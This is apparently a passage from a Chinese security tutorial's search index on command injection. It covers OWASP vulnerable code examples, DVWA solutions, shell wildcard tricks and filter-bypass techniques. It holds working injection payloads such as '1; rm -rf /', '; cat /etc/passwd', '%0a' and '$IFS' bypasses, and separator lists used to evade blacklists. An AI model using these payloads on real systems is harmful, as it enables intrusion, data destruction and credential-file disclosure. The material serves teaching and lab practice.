\u7684\u65f6\u5019\uff0c\u91cc\u9762\u7684\u5355\u4e2a\u5b57\u7b26\u4e32\u9700\u8981\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7\u62ec\u4f4f\uff0c\u5426\u5219\u5c31\u4f1a\u89c6\u4e3a\u591a\u4e2a\u7684\u5355\u4e2a\u5b57\u7b26","title":"\u8bed\u6cd5"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_21","text":"\u4ee5\u4e0b\u4e8b\u4f8bExample 1-6\u6765\u6e90\u4e8e OWASP","title":"\u4e3e\u4e2a\u4f8b\u5b50"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-1","text":"\u4ee5\u4e0b\u4ee3\u7801\u662fUNIX\u547d\u4ee4 cat \u7684\u5305\u88c5\u5668\uff0c\u5b83\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa\u3002 \u5b83\u4e5f\u662f\u53ef\u4ee5\u88ab\u6ce8\u5165\u7684\uff1a #include <stdio.h> #include <unistd.h> int main(int argc, char **argv) { char cat[] = \"cat \"; char *command; size_t commandLength; commandLength = strlen(cat) + strlen(argv[1]) + 1; command = (char *) malloc(commandLength); strncpy(command, cat, commandLength); strncat(command, argv[1], (commandLength - strlen(cat)) ); system(command); return (0); } \u6211\u4eec\u7f16\u8bd1\u5b8c\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u64cd\u4f5c\u6b63\u5e38\u4f7f\u7528 $ ./catWrapper Story.txt When last we left our heroes... \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5728\u8fd9\u884c\u7684\u672b\u5c3e\u4e4b\u540e\u52a0\u4e00\u4e2a ; \u548c\u53e6\u4e00\u4e2a\u547d\u4ee4\uff0c\u90a3\u4e48\u547d\u4ee4 catWrapper \u6267\u884c\u800c\u4e14\u4e5f\u4e0d\u4f1a\u51fa\u9519\u3002 $ ./catWrapper \"Story.txt; ls\" When last we left our heroes... Story.txt doubFree.c nullpointer.c unstosig.c www* a.out* format.c strlen.c useFree* catWrapper* misnull.c strlength.c useFree.c commandinjection.c nodefault.c trunc.c writeWhatWhere.c \u5982\u679c\u5c06 catWrapper \u8bbe\u7f6e\u4e3a\u5177\u6709\u6bd4\u6807\u51c6\u7528\u6237\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u66f4\u9ad8\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","title":"Example 1"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-2","text":"\u4ee5\u4e0b\u7b80\u5355\u7a0b\u5e8f\u63a5\u53d7\u6587\u4ef6\u540d\u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5e76\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u663e\u793a\u7ed9\u7528\u6237\u3002 \u8be5\u7a0b\u5e8f\u5b89\u88c5\u4e86 setuid root \uff0c\u5047\u8bbe\u539f\u672c\u5b83\u65e8\u5728\u7528\u4f5c\u5b66\u4e60\u5de5\u5177\uff0c\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u5728\u57f9\u8bad\u4e2d\u68c0\u67e5\u7279\u6743\u7cfb\u7edf\u6587\u4ef6\uff0c\u800c\u4e0d\u4f1a\u8ba9\u4ed6\u4eec\u4fee\u6539\u5b83\u4eec\u6216\u635f\u574f\u7cfb\u7edf\u3002 int main(char* argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \"; strcat(cmd, argv[1]); system(cmd); } \u7531\u4e8e\u7a0b\u5e8f\u4ee5 root \u6743\u9650\u8fd0\u884c\uff0c\u56e0\u6b64\u5bf9 system() \u7684\u8c03\u7528\u4e5f\u4ee5 root \u6743\u9650\u6267\u884c\u3002 \u5982\u679c\u7528\u6237\u6307\u5b9a\u6807\u51c6\u6587\u4ef6\u540d\uff0c\u5219\u7a0b\u5e8f\u8c03\u7528\u4f1a\u6309\u9884\u671f\u5de5\u4f5c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u653b\u51fb\u8005\u4f20\u9012 1; rm -rf / \u5f62\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u65e0\u8bba\u5f53\u524d\u76ee\u5f55\u662f\u5426\u6709 1 \u8fd9\u4e2a\u6587\u4ef6\uff0c\u90fd\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c rm -rf / \u3002","title":"Example 2"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-3","text":"\u672c\u4f8b\u4e2d\uff0c\u672c\u7a0b\u5e8f\u62e5\u6709\u5bf9\u5e94\u7684\u6743\u9650\uff0c\u4f7f\u7528\u73af\u5883\u53d8\u91cf $APPHOME \u6765\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u88c5\u76ee\u5f55\uff0c\u7136\u540e\u5728\u8be5\u76ee\u5f55\u4e2d\u6267\u884c\u521d\u59cb\u5316\u811a\u672c char* home=getenv(\"APPHOME\"); char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD)); if (cmd) { strcpy(cmd,home); strcat(cmd,INITCMD); execl(cmd, NULL); } \u672c\u4f8b\u524d\u63d0\u4e0e Example 2 \u4e2d\u4e00\u6837\uff0c\u6b64\u793a\u4f8b\u4e2d\u7684\u4ee3\u7801\u5141\u8bb8\u653b\u51fb\u8005\u4f7f\u7528\u5e94\u7528\u7a0b\u5e8f\u7684\u63d0\u5347\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u73af\u5883\u53d8\u91cf $APPHOME \u901a\u8fc7\u5236\u5b9a\u4e0d\u540c\u7684\u8def\u5f84\u4ee5\u4f7f\u7528\u542b\u6709\u6076\u610f\u4ee3\u7801\u7684 INITCMD \u3002 \u7531\u4e8e\u7a0b\u5e8f\u4e0d\u9a8c\u8bc1\u4ece getenv() \u8bfb\u53d6\u7684\u503c\uff0c\u56e0\u6b64\u901a\u8fc7\u63a7\u5236\u73af\u5883\u53d8\u91cf\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u6076\u610f\u4ee3\u7801\u3002 \u653b\u51fb\u8005\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u6765\u63a7\u5236\u7a0b\u5e8f\u8c03\u7528\u7684\u547d\u4ee4\uff0c\u56e0\u6b64\u5728\u6b64\u793a\u4f8b\u4e2d\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u662f\u975e\u5e38\u5de8\u5927\u7684\u3002","title":"Example 3"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-4","text":"\u4e0b\u9762\u7684\u4ee3\u7801\u6765\u81ea\u57fa\u4e8e Web \u7684 CGI \u5b9e\u7528\u7a0b\u5e8f\uff0c\u5141\u8bb8\u7528\u6237\u66f4\u6539\u5176\u5bc6\u7801\u3002 NIS\u4e0b\u7684\u5bc6\u7801\u66f4\u65b0\u8fc7\u7a0b\u5305\u62ec\u5728 /var/yp \u76ee\u5f55\u4e2d\u8fd0\u884c make \u3002 \u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u66f4\u65b0\u5bc6\u7801\u8bb0\u5f55\uff0c\u56e0\u6b64\u5df2\u5b89\u88c5 setuid root \u3002\u51fd\u6570\u5bf9 make \u8c03\u7528\u5982\u4e0b\uff1a system(\"cd /var/yp && make &> /dev/null\"); \u4e0e\u524d\u9762\u7684\u793a\u4f8b\u4e0d\u540c\uff0c\u6b64\u793a\u4f8b\u4e2d\u7684\u547d\u4ee4\u662f\u6ca1\u6709\u53ef\u63a7\u8f93\u5165\u7684\u786c\u7f16\u7801\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u65e0\u6cd5\u63a7\u5236\u4f20\u9012\u7ed9 system() \u7684\u53c2\u6570\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u4e3amake\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\uff0c\u5e76\u4e14\u5728\u8c03\u7528\u547d\u4ee4\u4e4b\u524d\u6ca1\u6709\u64e6\u9664\u4efb\u4f55\u73af\u5883\u53d8\u91cf\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u5176 $PATH \u53d8\u91cf\u4ee5\u6307\u5411\u540d\u4e3a make \u7684\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5e76\u4ece\u4e2d\u6267\u884c CGI \u811a\u672c\u3002 shell \u63d0\u793a\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u4e86 setuid root \uff0c\u56e0\u6b64\u653b\u51fb\u8005\u7684 make \u7248\u672c\u73b0\u5728\u4ee5 root \u6743\u9650\u8fd0\u884c\u3002 \u73af\u5883\u5728\u7a0b\u5e8f\u4e2d\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u65b9\u9762\u53d1\u6325\u7740\u91cd\u8981\u4f5c\u7528\u3002 system() \u548c exec() \u4e4b\u7c7b\u7684\u51fd\u6570\u4f7f\u7528\u8c03\u7528\u5b83\u4eec\u7684\u7a0b\u5e8f\u73af\u5883\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u6709\u53ef\u80fd\u5f71\u54cd\u8fd9\u4e9b\u8c03\u7528\u7684\u884c\u4e3a\u3002 \u6709\u5f88\u591a\u6587\u7ae0\u4f1a\u63d0\u5230 Java \u7684 Runtime.exec \u4e0e C \u7684\u7cfb\u7edf\u529f\u80fd\u5b8c\u5168\u76f8\u540c\u3002\u5176\u5b9e\u4e0d\u7136\u3002\u867d\u7136\u4e24\u8005\u90fd\u5141\u8bb8\u8c03\u7528\u65b0\u7684\u7a0b\u5e8f/\u8fdb\u7a0b\uff0c\u4f46\u662f\uff0c C \u7684\u7cfb\u7edf\u51fd\u6570\u5c06\u5176\u53c2\u6570\u4f20\u9012\u7ed9\u8981\u89e3\u6790\u7684 shell(/bin/sh) \uff0c\u800c Runtime.exec \u5c1d\u8bd5\u5c06\u5b57\u7b26\u4e32\u62c6\u5206\u4e3a\u5355\u8bcd\u6570\u7ec4\uff0c\u7136\u540e\u4f7f\u7528\u5176\u4f59\u5355\u8bcd\u6267\u884c\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5355\u8bcd\u4f5c\u4e3a\u53c2\u6570\u3002 Runtime.exec \u4e0d\u4f1a\u5c1d\u8bd5\u5728\u4efb\u4f55\u65f6\u5019\u8c03\u7528 shell \u3002\u5173\u952e\u7684\u533a\u522b\u5728\u4e8e shell \u63d0\u4f9b\u7684\u5927\u90e8\u5206\u529f\u80fd\u53ef\u88ab\u6076\u610f\u5229\u7528\u7684\u70b9\uff08\u4f8b\u5982 \uff06 \uff0c && \uff0c | \uff0c || \u7b49\u94fe\u63a5\u547d\u4ee4\uff0c\u91cd\u5b9a\u5411\u8f93\u5165\u548c\u8f93\u51fa\uff09\u5c06\u7b80\u5355\u5730\u7ed3\u675f\u4f5c\u4e3a\u4f20\u9012\u7ed9\u7b2c\u4e00\u4e2a\u547d\u4ee4\u7684\u53c2\u6570\uff0c\u53ef\u80fd\u5bfc\u81f4\u8bed\u6cd5\u9519\u8bef\uff0c\u6216\u88ab\u629b\u51fa\u4f5c\u4e3a\u65e0\u6548\u53c2\u6570\u3002","title":"Example 4"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-5","text":"\u4ee5\u4e0b\u7b80\u5355\u7684\u4ee3\u7801\u7247\u6bb5\u6613\u53d7 Unix/Linux \u5e73\u53f0\u4e0a\u7684OS\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\uff1a #include <stdlib.h> #include <stdio.h> #include <string.h> int main(int argc, char **argv) { char command[256]; if(argc != 2) { printf(\"Error: Please enter a program to time!\\n\"); return -1; } memset(&command, 0, sizeof(command)); strcat(command, \"time ./\"); strcat(command, argv[1]); system(command); return 0; } \u5982\u679c\u8fd9\u662f\u4e00\u4e2a suid \u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8bf7\u8003\u8651\u653b\u51fb\u8005\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\u7684\u60c5\u51b5: ls; cat /etc/passwd \u3002 \u5728Unix\u73af\u5883\u4e2d\uff0c shell \u547d\u4ee4\u7528\u5206\u53f7\u5206\u9694\u3002 \u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u968f\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff01","title":"Example 5"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#example-6","text":"<?php print(\"Please specify the name of the file to delete\"); print(\"<p>\"); $file=$_GET['filename']; system(\"rm $file\"); ?> \u4ee5\u4e0b\u6210\u529f\u653b\u51fb\u7684\u793a\u4f8b\uff1a Request: http://127.0.0.1/delete.php?filename=bob.txt;id Response: Please specify the name of the file to delete uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Example 6"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_22","text":"","title":"\u518d\u4e3e\u4e2a\u4f8b\u5b50"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_23","text":"$ cat /fl?? NUAACTF{56723419231} $ cat /???/??ss daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin _apt:x:102:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin","title":"?\u7684\u4f7f\u7528"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_24","text":"[...] \u5339\u914d\u65b9\u62ec\u53f7\u4e4b\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982 [aeiou] \u53ef\u4ee5\u5339\u914d\u4e94\u4e2a\u5143\u97f3\u5b57\u6bcd\u3002 # \u5b58\u5728\u6587\u4ef6 a.txt \u548c b.txt \u548c c.txt \u548c ab.txt $ ls [ab].txt a.txt b.txt $ ls *[ab].txt ab.txt a.txt b.txt $ ls [a-c].txt a.txt b.txt c.txt $ ls *[a-c].txt a.txt ab.txt abc.txt b.txt c.txt","title":"[&mldr;]\u7684\u4f7f\u7528"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_25","text":"{...} \u8868\u793a\u5339\u914d\u5927\u62ec\u53f7\u91cc\u9762\u7684\u6240\u6709\u6a21\u5f0f\uff0c\u6a21\u5f0f\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002 $ echo d{a,e,i,u,o}g dag deg dig dug dog # \u5927\u62ec\u53f7\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528 $ echo {j{p,pe}g,png} jpg jpeg png # {start..end}\u5339\u914d\u8fde\u7eed\u5b57\u7b26 $ cat /f{0..z}ag NUAACTF{56723419231} {...} \u4e0e [...] \u6709\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u533a\u522b\u3002\u5982\u679c\u5339\u914d\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c [...] \u4f1a\u5931\u53bb\u6a21\u5f0f\u7684\u529f\u80fd\uff0c\u53d8\u6210\u4e00\u4e2a\u5355\u7eaf\u7684\u5b57\u7b26\u4e32\uff0c\u800c {...} \u4f9d\u7136\u53ef\u4ee5\u5c55\u5f00\u3002 # \u4e0d\u5b58\u5728 a.txt \u548c b.txt $ ls [ab].txt ls: [ab].txt: No such file or directory $ ls {a,b}.txt ls: a.txt: No such file or directory ls: b.txt: No such file or directory","title":"{&mldr;}\u7684\u4f7f\u7528"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#tips","text":"\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e94\u8be5\u6ce8\u610f\uff1a \u901a\u914d\u7b26\u662f\u5148\u89e3\u91ca\uff0c\u518d\u6267\u884c\u3002 Bash \u63a5\u6536\u5230\u547d\u4ee4\u4ee5\u540e\uff0c\u53d1\u73b0\u91cc\u9762\u6709\u901a\u914d\u7b26\uff0c\u4f1a\u8fdb\u884c\u901a\u914d\u7b26\u6269\u5c55\uff0c\u7136\u540e\u518d\u6267\u884c\u547d\u4ee4\u3002 $ ls a*.txt ab.txt # \u4e0a\u9762\u547d\u4ee4\u7684\u6267\u884c\u8fc7\u7a0b\u662f\uff0cBash \u5148\u5c06a*.txt\u6269\u5c55\u6210ab.txt\uff0c\u7136\u540e\u518d\u6267\u884cls ab.txt\u3002 2. \u901a\u914d\u7b26\u4e0d\u5339\u914d\uff0c\u4f1a\u539f\u6837\u8f93\u51fa\u3002 Bash \u6269\u5c55\u901a\u914d\u7b26\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u4e0d\u5b58\u5728\u5339\u914d\u7684\u6587\u4ef6\uff0c\u4f1a\u5c06\u901a\u914d\u7b26\u539f\u6837\u8f93\u51fa\u3002 $ ls *.csv ls: *.csv: No such file or directory # \u53e6\u5916\uff0c\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\uff0c\u8fd9\u6761\u89c4\u5219\u5bf9{...}\u4e0d\u9002\u7528 3. \u53ea\u9002\u7528\u4e8e\u5355\u5c42\u8def\u5f84\u3002 \u4e0a\u9762\u6240\u6709\u901a\u914d\u7b26\u53ea\u5339\u914d\u5355\u5c42\u8def\u5f84\uff0c\u4e0d\u80fd\u8de8\u76ee\u5f55\u5339\u914d\uff0c\u5373\u65e0\u6cd5\u5339\u914d\u5b50\u76ee\u5f55\u91cc\u9762\u7684\u6587\u4ef6\u3002\u6216\u8005\u8bf4\uff0c ? \u6216 * \u8fd9\u6837\u7684\u901a\u914d\u7b26\uff0c\u4e0d\u80fd\u5339\u914d\u8def\u5f84\u5206\u9694\u7b26\uff08 / \uff09\u3002 \u5982\u679c\u8981\u5339\u914d\u5b50\u76ee\u5f55\u91cc\u9762\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 $ ls */*.txt 4. \u53ef\u7528\u4e8e\u6587\u4ef6\u540d\u3002 Bash \u5141\u8bb8\u6587\u4ef6\u540d\u4f7f\u7528\u901a\u914d\u7b26\u3002\u8fd9\u65f6\uff0c\u5f15\u7528\u6587\u4ef6\u540d\u7684\u65f6\u5019\uff0c\u9700\u8981\u628a\u6587\u4ef6\u540d\u653e\u5728\u5355\u5f15\u53f7\u91cc\u9762\u3002 $ touch 'fo*' $ ls fo* # \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2afo*\u6587\u4ef6\uff0c\u8fd9\u65f6*\u5c31\u662f\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\u3002","title":"Tips"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_26","text":"\u4ee5 DVWA \u4e3a\u4f8b","title":"\u8fd0\u7528"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#command-injection-low","text":"<?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u6ca1\u6709\u5bf9 ip \u8fdb\u884c\u8f93\u5165\u68c0\u6d4b\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ;cmd \u7684\u65b9\u5f0f\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002","title":"Command Injection: low"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#command-injection-medium","text":"<?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&&' => '', ';' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u4ec5\u4ec5\u53ea\u662f\u589e\u52a0\u4e86 && \u4e0e ; \u4e24\u4e2a\u7684\u8fc7\u6ee4\u3002\u7136\u800c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528 | \u6765\u8fdb\u884c\u7ed5\u8fc7\u3002","title":"Command Injection: medium"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#command-injection-high","text":"<?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&' => '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } ?> \u8fd9\u91cc\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u5176\u5b9e | \u7ba1\u9053\u7b26\u8fd9\u91cc\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u6240\u4ee5\u6211\u4eec medium \u7684 payload \u8fd8\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\uff0c\u4f46\u662f\u5982\u679c\u771f\u7684\u8fc7\u6ee4\u4e86 | \u600e\u4e48\u529e\u5462\u3002\u6211\u4eec\u5176\u5b9e\u8fd8\u53ef\u4ee5\u6293\u5305\u52a0\u5165 %0a \u6362\u884c\u7b26\u8fdb\u884c\u4e00\u4e2a\u7ed5\u8fc7\u3002\u4f7f\u7528 127.0.0.1 %0acat /etc/passwd \u8fdb\u884c\u7ed5\u8fc7","title":"Command Injection: high"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#command-injection-impossible","text":"<?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \".\", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"<pre>{$cmd}</pre>\"; } else { // Ops. Let the user name theres a mistake echo '<pre>ERROR: You have entered an invalid IP.</pre>'; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8fd9\u91cc\u5bf9 ip \u4ee5 . \u5206\u7ec4\u5e76\u68c0\u67e5\u4e86\u662f\u5426\u4e3a\u6570\u5b57\uff0c\u589e\u52a0\u4e86\u66f4\u591a\u7684\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6ca1\u529e\u6cd5\u4f7f\u7528\u4e4b\u524d\u90a3\u4e9b trick \u6765\u8fdb\u884c\u7ed5\u8fc7\u4e86\u3002","title":"Command Injection: impossible"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_27","text":"","title":"\u5e38\u7528\u7ed5\u8fc7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_28","text":"\u5728 Unix \u4e0a: %0a %0d ; & | $(shell_command) `shell_command` {shell_command,} \u5728 Windows \u4e0a\uff1a %0a & | %1a - \u4e00\u4e2a\u795e\u5947\u7684\u89d2\u8272\uff0c\u4f5c\u4e3a.bat\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4\u5206\u9694\u7b26 \u4f8b\u5982\uff1a <?php $command = 'dir '.$_POST['dir']; $escaped_command = escapeshellcmd($command); var_dump($escaped_command); file_put_contents('out.bat',$escaped_command); system('out.bat'); ?> \u53ef\u4ee5\u5229\u7528 %1a \u7ed5\u8fc7 dir=../ %1a whoami \u6bd4\u8f83\u8001\u7684 php \u7248\u672c\uff0c\u59825.2.5\u53ca\u4e4b\u524d\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u591a\u5b57\u8282\u6765\u7ed5\u8fc7\u3002\u73b0\u5728\u51e0\u4e4e\u89c1\u4e0d\u5230\u4e86\u3002 escapeshellcmd(\"echo \".chr(0xc0).\";id\"); //echo \u7e7a;id","title":"\u547d\u4ee4\u5206\u9694\u4e0e\u6267\u884c\u591a\u6761\u547d\u4ee4"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_29","text":"\u4f7f\u7528 < \u6216\u8005 <> $ cat</flag flag{xxx} $ cat<>/flag flag{xxx} 2. \u4f7f\u7528 IFS \u6216\u8005 $ cat$IFS$9/flag flag{xxx} $ cat${IFS}/flag flag{xxx} $ cat$IFS/flag flag{xxx} 3. \u5728 url \u7684\u7f16\u7801\u7ed5\u8fc7 \u8fd9\u91cc\u6211 fuzz \u4e86\u4e00\u4e0b\uff0c Linux bash 